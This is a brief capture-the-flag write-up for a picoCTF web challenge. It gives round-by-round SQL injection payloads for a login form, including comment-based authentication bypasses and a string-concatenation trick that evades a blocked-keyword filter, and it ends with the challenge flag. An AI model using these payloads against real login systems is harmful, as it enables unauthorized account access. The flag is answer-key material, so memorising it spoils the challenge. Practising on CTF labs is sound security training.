# Solution

- `http://jupiter.challenges.picoctf.org:44979/filter.php`
## Round 1:

```
username:admin' -- -
pass:lol
```
## Round 2:

- `SELECT * FROM users WHERE username='admin' -- -' AND password='sdsda'`

```
username:admin' /*
pass:asd
```
## Round 3:

- `SELECT * FROM users WHERE username='admin' /*' AND password='asd'`

```
username:admin';
pass:asd
```
## Round 4:

- Since `admin` word is blocked
- `SELECT * FROM users WHERE username='admin';' AND password='sdsa'`

```
username:ad'||'min';
pass:asd
```

## Round 5:

- `SELECT * FROM users WHERE username='ad'||'min';' AND password='sadsa'`

```
username:ad'||'min';
pass:
```

- Congrats! You won! Check out filter.php


- `picoCTF{y0u_m4d3_1t_16f769e719ab9d3e310fd13dc1262ee1}`

---
